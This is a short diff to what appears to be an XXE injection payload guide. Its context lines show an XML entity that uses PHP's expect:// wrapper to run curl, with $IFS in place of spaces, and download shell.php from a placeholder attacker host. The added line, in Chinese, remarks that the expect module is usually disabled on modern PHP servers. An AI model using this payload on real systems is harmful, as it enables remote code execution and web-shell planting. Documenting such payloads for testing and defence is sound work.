@@ -104,3 +104,4 @@ Injection:
   <!DOCTYPE email [
     <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
   ]>
+  在现代 PHP 服务器上，expect 模块默认没有安装或启用，所以这种攻击可能不会总是奏效
